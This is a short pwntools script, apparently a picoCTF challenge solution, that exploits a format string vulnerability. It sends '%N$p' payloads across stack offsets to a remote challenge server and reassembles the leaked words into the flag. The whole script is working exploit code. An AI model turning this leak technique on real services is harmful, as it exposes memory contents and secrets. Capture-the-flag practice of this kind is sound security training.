from pwn import *
context.log_level='debug'

# this is a format string bug
# the flag is read and placed on the stack
# but the flag is kind of long and takes multiple fmt strs to read
# you can manually run the exploit and manage the hex later
# or automate the leaking and handle byte wrangling with the script itself
# After manually piping in format strings, you can see it starts from offset 15

flag = b""
for offset in range(15, 25):
	p = connect("mercury.picoctf.net", 33411)
	p.sendlineafter("What would you like to do?\n", "1")
	p.sendlineafter("What is your API token?\n", f"%{offset}$p")
	p.recvuntil("Buying stonks with token:\n")
	out = p.recvline()
	try:
		result = p32(int(out, 16))
		flag += result
	except ValueError:
		pass
	p.close()

print(flag)
